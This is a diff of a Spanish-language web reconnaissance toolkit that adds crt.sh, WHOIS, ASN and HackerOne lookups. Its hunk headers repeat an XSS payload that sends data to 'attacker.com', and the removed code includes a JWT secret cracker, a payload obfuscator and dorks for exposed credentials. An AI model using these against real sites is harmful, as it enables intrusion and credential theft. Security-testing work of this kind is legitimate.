@@ -1319,6 +1319,7 @@ https://target.cepal.org/search?q=&lt;svg/onload=fetch('https://attacker.com?c='
       <button class="tk-btn sec" style="font-size:.6rem;padding:3px 8px;" onclick="exportThreatTXT()">⬇ EXPORT TXT</button>
       <button class="tk-btn sec" style="font-size:.6rem;padding:3px 8px;color:var(--red);" onclick="thClear()">✕ LIMPIAR</button>
     </div>
+    <div class="tk-note" id="th-note">// Ingresa URL, IP, dominio o hash para analizar</div>
     <div class="tk-output" id="out-th" style="min-height:280px;"></div>
   </div>
     <div class="tk-output" id="out-sh" style="min-height:300px;"></div>
@@ -1926,7 +1927,7 @@ https://target.cepal.org/search?q=&lt;svg/onload=fetch('https://attacker.com?c='
 <div id="tk-wayback" class="tk-panel">
   <div style="display:flex;gap:8px;margin-bottom:8px;flex-wrap:wrap;">
     <input class="tk-input" id="wayback-domain" placeholder="dominio.com" style="flex:3;font-size:.82rem;"/>
-    <select id="wayback-filter" class="tk-input" style="flex:1;font-size:.75rem;" onchange="runWayback()">
+    <select id="wayback-filter" class="tk-input" onchange="runWayback()" style="flex:1;font-size:.75rem;">
       <option value="all">Todos</option><option value="php">PHP</option><option value="api">API</option>
       <option value="admin">Admin</option><option value="login">Login</option><option value="backup">Backup</option>
       <option value="json">JSON/XML</option><option value="vuln">Vuln</option>
@@ -3342,26 +3343,10 @@ async function reconWHOIS(domain){
   var out=reconSection('WHOIS — '+domain);
   try{
     // who-dat.as93.net — free, no-CORS, no API key
-    var d=null;
-    try{
-      var _wr=await fetch('https://who-dat.as93.net/'+encodeURIComponent(domain),{signal:AbortSignal.timeout(8000)});
-      if(_wr.ok){var _wj=await _wr.json();if(!_wj.error) d=_wj;}
-    }catch(_we){}
-    if(!d){
-      try{
-        var _rr=await fetch('https://rdap.org/domain/'+encodeURIComponent(domain),{signal:AbortSignal.timeout(8000)});
-        if(_rr.ok){
-          var _rj=await _rr.json();
-          d={domain:_rj.ldhName||domain};
-          (_rj.events||[]).forEach(function(ev){
-            if(ev.eventAction==='registration') d.important_dates={created:ev.eventDate};
-            if(ev.eventAction==='expiration') (d.important_dates=d.important_dates||{}).expiry=ev.eventDate;
-          });
-          (_rj.nameservers||[]).forEach(function(ns){(d.name_servers=d.name_servers||[]).push(ns.ldhName);});
-        }
-      }catch(_re){}
-    }
-    if(!d) throw new Error('WHOIS no disponible');
+    var r=await fetch('https://who-dat.as93.net/'+encodeURIComponent(domain),{signal:AbortSignal.timeout(10000)});
+    if(!r.ok) throw new Error('HTTP '+r.status);
+    var d=await r.json();
+    if(d.error) throw new Error(d.error);
     var reg=d.registrar||{};
     var dates=d.important_dates||{};
     var contacts=d.contacts||{};
@@ -3403,8 +3388,19 @@ async function reconWHOIS(domain){
 async function reconSubs(domain){
   var out=reconSection('SUBDOMAINS — '+domain);
   try{
-    var r=await fetch('https://crt.sh/?q=%.'+encodeURIComponent(domain)+'&output=json',{signal:AbortSignal.timeout(15000)});
-    var certs=await r.json();
+    var certs=null;
+    try{
+      var _cu='https://crt.sh/?q=%.'+encodeURIComponent(domain)+'&output=json';
+      var _cr=await fetch(_cu,{signal:AbortSignal.timeout(18000)});
+      if(_cr.ok) certs=await _cr.json();
+    }catch(_ce){
+      try{
+        var _cp='https://api.allorigins.win/get?url='+encodeURIComponent('https://crt.sh/?q=%.'+encodeURIComponent(domain)+'&output=json');
+        var _cr2=await fetch(_cp,{signal:AbortSignal.timeout(22000)});
+        if(_cr2.ok){var _cw=await _cr2.json();certs=JSON.parse(_cw.contents);}
+      }catch(_ce2){}
+    }
+    if(!certs) throw new Error('crt.sh no disponible');
     // Extract unique subdomains
     var subs={};
     certs.forEach(function(cert){
@@ -3434,10 +3430,19 @@ async function reconSSL(domain){
   var out=reconSection('SSL / TLS — '+domain);
   try{
     // crt.sh for cert details — exact domain match
-    var r=await fetch('https://crt.sh/?q='+encodeURIComponent(domain)+'&output=json',
-      {signal:AbortSignal.timeout(12000)});
-    if(!r.ok) throw new Error('HTTP '+r.status);
-    var data=await r.json();
+    var data=null;
+    try{
+      var _su='https://crt.sh/?q='+encodeURIComponent(domain)+'&output=json';
+      var _sr=await fetch(_su,{signal:AbortSignal.timeout(18000)});
+      if(_sr.ok) data=await _sr.json();
+    }catch(_se){
+      try{
+        var _sp='https://api.allorigins.win/get?url='+encodeURIComponent('https://crt.sh/?q='+encodeURIComponent(domain)+'&output=json');
+        var _sr2=await fetch(_sp,{signal:AbortSignal.timeout(22000)});
+        if(_sr2.ok){var _sw=await _sr2.json();data=JSON.parse(_sw.contents);}
+      }catch(_se2){}
+    }
+    if(!data) throw new Error('crt.sh no disponible');
     if(!data||!data.length) throw new Error('Sin certificados en CT logs');
 
     // Sort by most recent logged
@@ -4762,9 +4767,18 @@ async function runCrtSh(){
   crtshClear('<span style="color:rgba(0,255,65,.4)">// Consultando crt.sh para: '+escH(q)+'...</span>\n');
   try{
     var url='https://crt.sh/?q='+encodeURIComponent(q)+'&output=json';
-    var r=await fetch(url,{signal:AbortSignal.timeout(20000)});
-    if(!r.ok) throw new Error('HTTP '+r.status);
-    var data=await r.json();
+    var data=null;
+    try{
+      var _r1=await fetch(url,{signal:AbortSignal.timeout(18000)});
+      if(_r1.ok) data=await _r1.json();
+      else throw new Error('HTTP '+_r1.status);
+    }catch(_e1){
+      try{
+        var _r2=await fetch('https://api.allorigins.win/get?url='+encodeURIComponent(url),{signal:AbortSignal.timeout(22000)});
+        if(_r2.ok){var _w2=await _r2.json();data=JSON.parse(_w2.contents);}
+      }catch(_e2){}
+    }
+    if(!data) throw new Error('crt.sh no disponible — intenta de nuevo en unos segundos');
     // Deduplicate by common_name
     var seen={};
     data.forEach(function(entry){
@@ -4938,6 +4952,18 @@ async function runASN(){
       '<a href="https://ipinfo.io/'+encodeURIComponent(asnFull)+'" target="_blank" style="color:rgba(0,255,65,.5);font-size:.65rem;">ipinfo.io ↗</a>  '+
       '<a href="https://whois.arin.net/rest/asn/'+encodeURIComponent(asnFull)+'" target="_blank" style="color:rgba(0,255,65,.5);font-size:.65rem;">ARIN WHOIS ↗</a>\n'
     );
+  }
+  // BGPView — extra ASN detail
+  if(asnNum){
+    try{
+      var _bv=await fetch('https://api.bgpview.io/asn/'+encodeURIComponent(asnNum),{signal:AbortSignal.timeout(8000)});
+      if(_bv.ok){
+        var _bd=(await _bv.json()).data||{};
+        if(_bd.description_short) asnOut('<span style="color:rgba(0,255,65,.4)">Desc     :</span> '+escH(_bd.description_short)+'\n');
+        if(_bd.prefixes_count) asnOut('<span style="color:rgba(0,255,65,.4)">Prefixes :</span> '+escH(String(_bd.prefixes_count))+'\n');
+        if(_bd.website) asnOut('<span style="color:rgba(0,255,65,.4)">Web      :</span> <a href="'+escH(_bd.website)+'" target="_blank" style="color:rgba(0,255,65,.6)">'+escH(_bd.website)+'↗</a>\n');
+      }
+    }catch(_e){}
   }
   if(ip){
     asnOut(
@@ -5543,72 +5569,7 @@ function int2ip(n){
   return [(n>>>24)&255,(n>>>16)&255,(n>>>8)&255,n&255].join('.');
 }
 
-async function analyzeHeaders(){
-  var raw=(document.getElementById('headers-url')||{value:''}).value.trim();
-  var o=document.getElementById('headers-out');
-  if(!raw){alert('Ingresa URL o dominio');return;}
-  var url=raw.startsWith('http')?raw:'https://'+raw;
-  o.innerHTML='<span style="color:rgba(0,255,65,.4)">// Analizando: '+escH(url)+'...</span>\n';
-  try{
-    var r=await fetch('https://api.allorigins.win/get?url='+encodeURIComponent(url),{signal:AbortSignal.timeout(12000)});
-    if(!r.ok) throw new Error('HTTP '+r.status);
-    var d=await r.json();
-    var h={};
-    Object.keys(d.headers||{}).forEach(function(k){h[k.toLowerCase()]=d.headers[k];});
-    var checks=[
-      {name:'Strict-Transport-Security',key:'strict-transport-security',weight:25,
-       good:function(v){return !!(v&&v.includes('max-age=')&&parseInt((v.match(/max-age=(\d+)/)||[0,0])[1])>=15768000);},
-       tip:'Strict-Transport-Security: max-age=31536000; includeSubDomains; preload'},
-      {name:'Content-Security-Policy',key:'content-security-policy',weight:25,
-       good:function(v){return !!(v&&v.length>10);},
-       tip:"Content-Security-Policy: default-src 'self'; script-src 'self'"},
-      {name:'X-Frame-Options',key:'x-frame-options',weight:15,
-       good:function(v){return !!(v&&/deny|sameorigin/i.test(v));},
-       tip:'X-Frame-Options: SAMEORIGIN'},
-      {name:'X-Content-Type-Options',key:'x-content-type-options',weight:15,
-       good:function(v){return !!(v&&v.toLowerCase()==='nosniff');},
-       tip:'X-Content-Type-Options: nosniff'},
-      {name:'Referrer-Policy',key:'referrer-policy',weight:5,
-       good:function(v){return !!(v&&v.length>3);},
-       tip:'Referrer-Policy: strict-origin-when-cross-origin'},
-      {name:'Permissions-Policy',key:'permissions-policy',weight:5,
-       good:function(v){return !!(v&&v.length>3);},
-       tip:'Permissions-Policy: geolocation=(), microphone=(), camera=()'},
-      {name:'X-XSS-Protection',key:'x-xss-protection',weight:3,
-       good:function(v){return !!(v&&v.startsWith('1'));},
-       tip:'X-XSS-Protection: 1; mode=block'},
-      {name:'Cache-Control',key:'cache-control',weight:2,
-       good:function(v){return !!(v&&/no-store|no-cache|private/.test(v));},
-       tip:'Cache-Control: no-store (para páginas sensibles)'},
-    ];
-    var score=0,maxScore=0,html='';
-    html+='<span style="color:rgba(0,255,65,.4)">// Fingerprint headers:</span>\n';
-    ['server','x-powered-by','via','x-generator'].forEach(function(hk){
-      if(h[hk]) html+='  <span style="color:var(--amber)">'+escH(hk)+'</span>: '+escH(String(h[hk]).substring(0,100))+' <span style="color:var(--red)">[expuesto]</span>\n';
-    });
-    if(!h.server&&!h['x-powered-by']) html+='  (sin headers de fingerprint ✓)\n';
-    html+='\n<span style="color:rgba(0,255,65,.4)">// Security headers:</span>\n';
-    checks.forEach(function(ck){
-      maxScore+=ck.weight; var val=h[ck.key]||''; var ok=ck.good(val);
-      if(ok) score+=ck.weight;
-      html+=(ok?'<span style="color:var(--g)">✓</span>':'<span style="color:var(--red)">✗</span>')+
-        ' <span style="color:'+(ok?'var(--g)':'var(--red)')+'">'+ck.name+'</span>';
-      if(val) html+=' <span style="color:rgba(0,255,65,.25);font-size:.62em;">'+escH(val.substring(0,70))+'</span>';
-      html+='\n';
-      if(!ok) html+='   <span style="color:rgba(255,200,0,.55);font-size:.63em;">💡 '+escH(ck.tip)+'</span>\n';
-    });
-    var pct=Math.round(score/maxScore*100);
-    var grade=pct>=90?'A+':pct>=80?'A':pct>=70?'B':pct>=50?'C':pct>=30?'D':'F';
-    var gc=grade.startsWith('A')?'var(--g)':grade==='B'?'#ffc800':grade==='C'?'var(--amber)':'var(--red)';
-    o.innerHTML='<div style="display:flex;align-items:center;gap:16px;margin-bottom:12px;">'+
-      '<div style="font-size:3rem;font-weight:900;color:'+gc+';">'+grade+'</div>'+
-      '<div><div style="color:'+gc+';font-size:.75rem;">'+pct+'% — Security Grade</div>'+
-      '<div style="color:rgba(0,255,65,.4);font-size:.62rem;">'+score+'/'+maxScore+' pts · '+escH(url)+'</div></div></div>\n'+html;
-  }catch(e){
-    o.innerHTML='<span style="color:var(--red)">// Error: '+escH(e.message)+'</span>\n'+
-      '<a href="https://securityheaders.com/?q='+encodeURIComponent(raw)+'" target="_blank" style="color:rgba(0,255,65,.5)">↗ SecurityHeaders.com</a>\n';
-  }
-}
+
 
 function analyzeHeadersManual(){
   var raw=(document.getElementById('ha-input')||{value:''}).value.trim();
@@ -6890,31 +6851,37 @@ async function runTarget(){
     });
     tgtOut('</div>\n','');
 
-    // Email reputation: derive from existing MX/SPF/DMARC data (already collected)
-    // No external API needed — we already have this data
+    // Email OSINT via emailrep.io (CORS-native, no key)
+    try{
+      var emailR=await fetch('https://emailrep.io/query/'+encodeURIComponent('test@'+domain),
+        {signal:AbortSignal.timeout(6000)});
+      if(emailR.ok){
+        // Get domain email pattern via haveibeenpwned domain search
+        var haveR=await fetch('https://haveibeenpwned.com/api/v3/breacheddomain/'+encodeURIComponent(domain),
+          {headers:{'hibp-api-key':''},signal:AbortSignal.timeout(5000)});
+      }
+    }catch(e){}
 
     // Bug Bounty quick check
     tgtProgress(93,'Fase 5 · Bug Bounty scope...');
     try{
-      // HackerOne public programs (no auth needed for public list via intigriti/bugcrowd APIs)
-      // Use Intigriti public API instead (actually public)
-      var bbR=await fetch('https://api.intigriti.com/core/researcher/programs?limit=50',
+      var bbR=await fetch('https://api.hackerone.com/v1/hackers/programs?page[size]=100',
         {headers:{'Accept':'application/json'},signal:AbortSignal.timeout(8000)});
       if(bbR.ok){
         var bbD=await bbR.json();
-        var progs=bbD.items||bbD.records||[];
-        var domainMatch=progs.filter(function(p){
-          var scope=JSON.stringify(p).toLowerCase();
-          return scope.includes(domain.toLowerCase())||scope.includes(domain.split('.')[0].toLowerCase());
+        var rootDom=domain.split('.').slice(-2).join('.');
+        var keyword=rootDom.split('.')[0];
+        var progs=(bbD.data||[]).filter(function(p){
+          var h=(p.attributes&&p.attributes.handle)||'';
+          var n=(p.attributes&&p.attributes.name)||'';
+          return h.toLowerCase().indexOf(keyword)>=0||n.toLowerCase().indexOf(keyword)>=0;
         });
-        if(domainMatch.length){
-          tgtGood('Bug Bounty: '+domainMatch.length+' programa(s) encontrado(s) en Intigriti');
-          domainMatch.slice(0,3).forEach(function(p){
-            tgtRow('Programa BB',escH((p.name||p.handle||'—')+' — '+('maxBounty' in p?'$'+p.maxBounty:'')));
-          });
-          _targetData.bugBounty=domainMatch;
+        if(progs.length){
+          _targetData.bugBounty=progs;
+          tgtGood('Bug Bounty HackerOne: '+progs.length+' programa(s) — '+
+            progs.map(function(p){return (p.attributes&&p.attributes.name)||'';}).join(', '));
         } else {
-          tgtRow('Bug Bounty','Sin programa público detectado en Intigriti');
+          tgtOut('<div style="padding-left:14px;font-family:var(--font);font-size:.62rem;color:rgba(0,255,65,.3);">// Sin programa HackerOne público encontrado</div>','');
         }
       }
     }catch(e){}
@@ -7202,254 +7169,36 @@ async function runAttackTimeline(){
   }
 }
 
-async function runCrtSh(){
-  var d=document.getElementById('crtsh-target').value.trim().replace(/^https?:\/\//,'').replace(/\/.*/,'');
-  var mode=document.getElementById('crtsh-mode').value;
-  var o=document.getElementById('crtsh-out');
-  if(!d){alert('Ingresa un dominio');return;}
-  o.innerHTML='<span style="color:rgba(0,255,65,.4)">// Consultando crt.sh...</span>\n';
-  var q=mode==='sub'?'%.'+d:d;
-  try{
-    var r=await fetch('https://crt.sh/?q='+encodeURIComponent(q)+'&output=json',{signal:AbortSignal.timeout(20000)});
-    if(!r.ok) throw new Error('HTTP '+r.status);
-    var data=await r.json();
-    var seen={};_crtData=[];
-    data.forEach(function(e){
-      var names=(e.name_value||'').split('\n');
-      names.forEach(function(n){
-        n=n.trim().toLowerCase().replace(/^\*\./,'');
-        if(!n||seen[n]) return;
-        seen[n]=1;
-        _crtData.push({name:n,issuer:e.issuer_name||'',notBefore:e.not_before||'',notAfter:e.not_after||'',serial:e.serial_number||''});
-      });
-    });
-    _crtData.sort(function(a,b){return a.name.localeCompare(b.name);});
-    crtshRender(_crtData);
-  }catch(e){o.innerHTML='<span style="color:var(--red)">// Error: '+escX(e.message)+'</span>';}
-}
+
 function escX(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
-function crtshRender(arr){
-  var o=document.getElementById('crtsh-out');
-  var now=new Date();
-  var html='<span style="color:var(--g)">// '+arr.length+' certificados encontrados</span>\n\n';
-  arr.forEach(function(e){
-    var exp=e.notAfter?new Date(e.notAfter):null;
-    var isExp=exp&&exp<now;
-    var col=isExp?'var(--red)':'var(--g)';
-    html+='<span style="color:'+col+'">'+escX(e.name)+'</span>';
-    if(e.notAfter) html+=' <span style="color:rgba(0,255,65,.3);font-size:.7em;">exp:'+escX(e.notAfter.substring(0,10))+'</span>';
-    if(e.issuer) html+=' <span style="color:rgba(0,255,65,.25);font-size:.65em;">'+escX(e.issuer.substring(0,40))+'</span>';
-    html+='\n';
-  });
-  o.innerHTML=html;
-}
-function crtshFilter(type){
-  if(!_crtData.length) return;
-  var now=new Date();
-  var filtered=_crtData.filter(function(e){
-    if(type==='active') return !e.notAfter||new Date(e.notAfter)>=now;
-    if(type==='expired') return e.notAfter&&new Date(e.notAfter)<now;
-    return true;
-  });
-  crtshRender(filtered);
-}
-function crtshExport(){
-  if(!_crtData.length){alert('Ejecuta una búsqueda primero');return;}
-  var txt=_crtData.map(function(e){return [e.name,e.issuer,e.notBefore,e.notAfter,e.serial].join('\t');}).join('\n');
-  var b=new Blob(['name\tissuer\tnotBefore\tnotAfter\tserial\n'+txt],{type:'text/plain'});
-  var a=document.createElement('a');a.href=URL.createObjectURL(b);a.download='crtsh_results.txt';a.click();
-}
+
+
+
 
 // ══════════════════════════════════════════════════════════
 //  ASN LOOKUP
 // ══════════════════════════════════════════════════════════
-async function runASN(){
-  var q=document.getElementById('asn-input').value.trim();
-  var o=document.getElementById('asn-out');
-  if(!q){alert('Ingresa un ASN o IP');return;}
-  o.innerHTML='<span style="color:rgba(0,255,65,.4)">// Consultando bgp.tools...</span>\n';
-  try{
-    var isASN=/^AS\d+$/i.test(q);
-    var url=isASN
-      ?'https://api.bgpview.io/asn/'+q.replace(/^AS/i,'')
-      :'https://api.bgpview.io/ip/'+encodeURIComponent(q);
-    var r=await fetch(url,{signal:AbortSignal.timeout(12000)});
-    if(!r.ok) throw new Error('HTTP '+r.status);
-    var d=await r.json();
-    var html='';
-    if(isASN){
-      var a=d.data||{};
-      html+='<span style="color:var(--g)">// ASN: '+escX(a.asn||q)+'</span>\n';
-      html+='  Name:        '+escX(a.name||'N/A')+'\n';
-      html+='  Description: '+escX(a.description_short||a.description_long||'N/A')+'\n';
-      html+='  Country:     '+escX(a.country_code||'N/A')+'\n';
-      html+='  RIR:         '+escX(a.rir_allocation&&a.rir_allocation.rir_name||'N/A')+'\n';
-      html+='  Email:       '+escX((a.abuse_contacts&&a.abuse_contacts[0]&&a.abuse_contacts[0].email)||'N/A')+'\n';
-      if(a.prefixes&&a.prefixes.length){
-        html+='\n<span style="color:rgba(0,255,65,.5)">// IPv4 Prefixes ('+a.prefixes.length+')</span>\n';
-        a.prefixes.slice(0,15).forEach(function(p){html+='  '+escX(p.prefix)+' — '+escX(p.name||'')+'\n';});
-        if(a.prefixes.length>15) html+='  ... y '+(a.prefixes.length-15)+' más\n';
-      }
-    } else {
-      var ip=((d.data||{}).prefixes||[])[0]||{};
-      var asns=((d.data||{}).rir_allocation)||{};
-      html+='<span style="color:var(--g)">// IP: '+escX(q)+'</span>\n';
-      html+='  ASN:     '+escX((ip.asn&&ip.asn.asn)||'N/A')+'\n';
-      html+='  AS Name: '+escX((ip.asn&&ip.asn.name)||'N/A')+'\n';
-      html+='  Prefix:  '+escX(ip.prefix||'N/A')+'\n';
-      html+='  Country: '+escX(ip.country_code||'N/A')+'\n';
-      html+='  RIR:     '+escX(asns.rir_name||'N/A')+'\n';
-    }
-    o.innerHTML=html;
-  }catch(e){o.innerHTML='<span style="color:var(--red)">// Error: '+escX(e.message)+'</span>';}
-}
+
 
 // ══════════════════════════════════════════════════════════
 //  JWT DECODER / VERIFIER / CRACKER
 // ══════════════════════════════════════════════════════════
-function jwtVerify(){
-  var raw=(document.getElementById('jwt-input')||{value:''}).value.trim();
-  var o=document.getElementById('jwt-out');
-  if(!raw){alert('Pega un JWT');return;}
-  try{
-    var parts=raw.split('.');
-    if(parts.length!==3) throw new Error('No es un JWT válido (debe tener 3 partes)');
-    function b64d(s){
-      s=s.replace(/-/g,'+').replace(/_/g,'/');
-      while(s.length%4) s+='=';
-      return JSON.parse(atob(s));
-    }
-    var header=b64d(parts[0]);
-    var payload=b64d(parts[1]);
-    var sig=parts[2];
-    var now=Math.floor(Date.now()/1000);
-    var exp=payload.exp;
-    var iat=payload.iat;
-    var isExp=exp&&exp<now;
-    var html='';
-    html+='<span style="color:var(--amber)">// HEADER</span>\n'+JSON.stringify(header,null,2)+'\n\n';
-    html+='<span style="color:var(--g)">// PAYLOAD</span>\n'+JSON.stringify(payload,null,2)+'\n\n';
-    html+='<span style="color:rgba(0,255,65,.4)">// SIGNATURE (base64url)</span>\n'+escX(sig.substring(0,40))+'...\n\n';
-    html+='<span style="color:rgba(0,255,65,.4)">// ANÁLISIS</span>\n';
-    html+='  Algoritmo: <span style="color:var(--amber)">'+escX(header.alg||'?')+'</span>';
-    if(header.alg==='none') html+=' <span style="color:var(--red)">⚠ PELIGROSO — alg:none acepta cualquier firma</span>';
-    html+='\n';
-    if(exp) html+='  Expiración: '+new Date(exp*1000).toISOString()+' '+(isExp?'<span style="color:var(--red)">⚠ EXPIRADO</span>':'<span style="color:var(--g)">✓ VIGENTE</span>')+'\n';
-    if(iat) html+='  Emitido:    '+new Date(iat*1000).toISOString()+'\n';
-    if(payload.sub) html+='  Subject:    '+escX(payload.sub)+'\n';
-    if(payload.iss) html+='  Issuer:     '+escX(payload.iss)+'\n';
-    if(header.alg&&header.alg.startsWith('HS')) html+='\n  <span style="color:rgba(0,255,65,.4)">// Firma HMAC — verifica con secret conocido o usa crack</span>\n';
-    o.innerHTML=html;
-  }catch(e){o.innerHTML='<span style="color:var(--red)">// Error: '+escX(e.message)+'</span>';}
-}
-async function jwtCrack(){
-  var raw=(document.getElementById('jwt-input')||{value:''}).value.trim();
-  var o=document.getElementById('jwt-out');
-  if(!raw){alert('Pega un JWT primero');return;}
-  var parts=raw.split('.');
-  if(parts.length!==3){alert('JWT inválido');return;}
-  var wordlist=['secret','password','123456','admin','test','key','jwt','secret123',
-    'mysecret','token','letmein','qwerty','abc123','pass','default','changeme',
-    'supersecret','private','publickey','dev','prod','app'];
-  o.innerHTML='<span style="color:rgba(0,255,65,.4)">// Iniciando dictionary attack ('+wordlist.length+' palabras)...</span>\n';
-  var header=atob(parts[0].replace(/-/g,'+').replace(/_/g,'/'));
-  var found=false;
-  for(var i=0;i<wordlist.length;i++){
-    var word=wordlist[i];
-    try{
-      var enc=new TextEncoder();
-      var key=await crypto.subtle.importKey('raw',enc.encode(word),{name:'HMAC',hash:'SHA-256'},false,['sign']);
-      var sig=await crypto.subtle.sign('HMAC',key,enc.encode(parts[0]+'.'+parts[1]));
-      var b64=btoa(String.fromCharCode(...new Uint8Array(sig))).replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,'');
-      if(b64===parts[2]){
-        o.innerHTML+='<span style="color:var(--g)">✓ SECRET ENCONTRADO: <strong>'+escX(word)+'</strong></span>\n';
-        found=true;break;
-      }
-    }catch(e){}
-    if(i%5===0) o.innerHTML='<span style="color:rgba(0,255,65,.4)">// Probando ['+i+'/'+wordlist.length+']: '+escX(word)+'...</span>\n';
-    await new Promise(function(r){setTimeout(r,0);});
-  }
-  if(!found) o.innerHTML+='<span style="color:rgba(0,255,65,.4)">// Secret no encontrado en wordlist básica</span>\n';
-}
-function jwtClear(){
-  var i=document.getElementById('jwt-input');
-  var o=document.getElementById('jwt-out');
-  if(i) i.value='';
-  if(o) o.innerHTML='';
-}
+
+
+
 
 // ══════════════════════════════════════════════════════════
 //  OBFUSCATOR
 // ══════════════════════════════════════════════════════════
-var OBF_PRESETS_DEFS=[
-  {id:'url',name:'URL Encode',fn:function(s){return encodeURIComponent(s);}},
-  {id:'html',name:'HTML Entities',fn:function(s){return s.split('').map(function(c){return'&#'+c.charCodeAt(0)+';';}).join('');}},
-  {id:'b64',name:'Base64',fn:function(s){return btoa(unescape(encodeURIComponent(s)));}},
-  {id:'hex',name:'Hex \\xNN',fn:function(s){return s.split('').map(function(c){return'\\x'+c.charCodeAt(0).toString(16).padStart(2,'0');}).join('');}},
-  {id:'hexraw',name:'Hex Raw %NN',fn:function(s){return s.split('').map(function(c){return'%'+c.charCodeAt(0).toString(16).toUpperCase().padStart(2,'0');}).join('');}},
-  {id:'unicode',name:'Unicode \\uNNNN',fn:function(s){return s.split('').map(function(c){return'\\u'+c.charCodeAt(0).toString(16).padStart(4,'0');}).join('');}},
-  {id:'oct',name:'Octal',fn:function(s){return s.split('').map(function(c){return'\\'+c.charCodeAt(0).toString(8);}).join('');}},
-  {id:'rot13',name:'ROT13',fn:function(s){return s.replace(/[a-zA-Z]/g,function(c){var b=c<='Z'?65:97;return String.fromCharCode((c.charCodeAt(0)-b+13)%26+b);});}},
-];
-function obfUpdatePresets(){
-  var sel=document.getElementById('obf-preset');
-  if(!sel) return;
-  sel.innerHTML='';
-  OBF_PRESETS_DEFS.forEach(function(p){
-    var o=document.createElement('option');o.value=p.id;o.textContent=p.name;sel.appendChild(o);
-  });
-}
-function obfRun(){
-  var inp=(document.getElementById('obf-input')||{value:''}).value;
-  var preset=(document.getElementById('obf-preset')||{value:''}).value;
-  var o=document.getElementById('obf-out');
-  if(!inp){alert('Ingresa texto');return;}
-  var def=OBF_PRESETS_DEFS.find(function(p){return p.id===preset;});
-  if(!def){o.innerHTML='<span style="color:var(--red)">// Preset no encontrado</span>';return;}
-  try{
-    var result=def.fn(inp);
-    o.innerHTML='<span style="color:rgba(0,255,65,.4)">// '+escX(def.name)+'</span>\n<span style="color:var(--g)">'+escX(result)+'</span>';
-  }catch(e){o.innerHTML='<span style="color:var(--red)">// Error: '+escX(e.message)+'</span>';}
-}
-function obfCopy(){
-  var o=document.getElementById('obf-out');
-  if(!o||!o.textContent.trim()){alert('Nada que copiar');return;}
-  var text=o.textContent.replace(/^\/\/[^\n]+\n/,'');
-  navigator.clipboard.writeText(text.trim()).then(function(){alert('Copiado ✓');});
-}
-function obfClear(){
-  var i=document.getElementById('obf-input');var o=document.getElementById('obf-out');
-  if(i) i.value='';if(o) o.innerHTML='';
-}
+// (old obf system removed — using new obfRun/obfApply above)
+
 
 // ══════════════════════════════════════════════════════════
 //  DORKS — openAllDorks
 // ══════════════════════════════════════════════════════════
-function dorkOpen(type){
-  var d=(document.getElementById('dorks-target')||{value:''}).value.trim();
-  if(!d){alert('Ingresa un dominio');return;}
-  var dorks=[];
-  if(type==='all'||type==='site') dorks.push('https://www.google.com/search?q=site:'+encodeURIComponent(d));
-  if(type==='all'||type==='files') dorks.push('https://www.google.com/search?q=site:'+encodeURIComponent(d)+'+ext:pdf+OR+ext:doc+OR+ext:xls+OR+ext:sql');
-  if(type==='all'||type==='admin') dorks.push('https://www.google.com/search?q=site:'+encodeURIComponent(d)+'+inurl:admin+OR+inurl:login+OR+inurl:panel');
-  if(type==='all'||type==='expose') dorks.push('https://www.google.com/search?q=site:'+encodeURIComponent(d)+'+intext:password+OR+intext:username+OR+intext:config');
-  if(type==='all'||type==='git') dorks.push('https://www.google.com/search?q=site:'+encodeURIComponent(d)+'+inurl:.git');
-  if(type==='all'||type==='shodan') dorks.push('https://www.shodan.io/search?query=hostname:'+encodeURIComponent(d));
-  if(type==='all') dorks.push('https://www.google.com/search?q=site:'+encodeURIComponent(d)+'+filetype:env+OR+filetype:bak+OR+filetype:conf');
-  dorks.forEach(function(url,i){
-    setTimeout(function(){window.open(url,'_blank');},i*400);
-  });
-}
-function dorkCopyAll(){
-  var o=document.getElementById('dorks-out');
-  if(o&&o.textContent.trim()) navigator.clipboard.writeText(o.textContent).then(function(){alert('Dorks copiados ✓');});
-}
-function dorkExport(){
-  var o=document.getElementById('dorks-out');
-  if(!o||!o.textContent.trim()){alert('Genera dorks primero');return;}
-  var b=new Blob([o.textContent],{type:'text/plain'});
-  var a=document.createElement('a');a.href=URL.createObjectURL(b);a.download='dorks.txt';a.click();
-}
+
+
+
 
 // ══════════════════════════════════════════════════════════
 //  CVE DATABASE SEARCH
@@ -7532,7 +7281,7 @@ async function searchCVE(){
 
 async function checkBugBounty(){
   var d=(document.getElementById('bb-target')||{value:''}).value.trim().replace(/^https?:\/\//,'').replace(/\/.*/,'');
-  var o=document.getElementById('bb-out');
+  var o=document.getElementById('out-bb');
   if(!d){alert('Ingresa un dominio');return;}
   o.innerHTML='<span style="color:rgba(0,255,65,.4)">// Buscando programas de Bug Bounty para: '+escX(d)+'</span>\n\n';
 
@@ -8279,6 +8028,9 @@ async function renderGeoMap(){
 //  WAYBACK CDX — URLs históricas
 // ══════════════════════════════════════════════════════════════
 var _waybackURLs=[];
+function waybackFilter(){
+  runWayback();
+}
 async function runWayback(){
   var domain=(document.getElementById('wayback-domain')||{value:''}).value.trim().replace(/^https?:\/\//,'').replace(/\/.*/,'');
   var filter=(document.getElementById('wayback-filter')||{value:'all'}).value;
@@ -8313,16 +8065,6 @@ async function runWayback(){
     o.innerHTML='<span style="color:var(--red)">// Error: '+escH(e.message)+'</span>\n';
   }
 }
-function waybackFilter(btn, val){
-  if(btn){
-    btn.closest('div').querySelectorAll('.wf-btn').forEach(function(b){b.classList.remove('active');});
-    btn.classList.add('active');
-  }
-  var sel=document.getElementById('wayback-filter');
-  if(sel) sel.value=val;
-  runWayback();
-}
-
 function waybackExport(){
   if(!_waybackURLs.length){alert('Ejecuta una búsqueda primero');return;}
   var b=new Blob([_waybackURLs.join('\n')],{type:'text/plain'});
@@ -9008,8 +8750,7 @@ function generateTargetPDF(mode){
       var missingHdrs=d.secHeaders._missing.map(function(m){return m.info.name;}).join(', ');
       execRecs.push({pri:'MEDIA',action:'Implementar cabeceras de seguridad HTTP faltantes: '+missingHdrs,impact:'Ausencia de estas cabeceras expone a usuarios a XSS, clickjacking y ataques de protocol downgrade',effort:'3-5 días'});
     } else {
-    var _totalCVEs=(d.cves&&d.cves.length)||0||(d.cveDetails&&d.cveDetails.length)||0;
-    if(_totalCVEs>=10) execRecs.push({pri:'ALTA',action:'Implementar programa de patch management mensual ('+_totalCVEs+' CVEs acumulados)',impact:'Acumulación crítica indica ausencia de proceso de gestión de vulnerabilidades',effort:'Proceso continuo'});
